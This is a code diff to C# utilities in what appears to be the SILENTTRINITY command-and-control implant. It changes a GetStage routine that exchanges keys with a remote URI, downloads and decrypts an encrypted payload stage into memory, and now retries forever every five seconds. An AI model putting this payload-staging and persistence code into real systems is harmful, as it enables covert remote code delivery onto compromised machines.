@@ -8,6 +8,8 @@ using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.IO.Compression;
+using System.Threading.Tasks;
+using System.Threading;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -41,15 +43,22 @@ namespace SILENTTRINITY.Utilities
 
             public static MemoryStream GetStage(Uri uri)
             {
+                do
+                {
+                    try
+                    {
+                        var key = Crypto.KeyExchange(uri);
+                        var stage = Crypto.Decrypt(key, Http.Get(uri));
+                        return new MemoryStream(stage);
+                    }
+                    catch 
+                    {
+                        Thread.Sleep(5000);
 #if DEBUG
-                Console.WriteLine("Getting the keys...");
+                        Console.WriteLine("Retrying key exchange...");
 #endif
-                var key = Crypto.KeyExchange(uri);
-                var stage = Crypto.Decrypt(key, Http.Get(uri));
-#if DEBUG
-                Console.WriteLine("The keys worked! The intial stage was successfully decrypted!");
-#endif
-                return new MemoryStream(stage);
+                    }
+                } while (true);
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
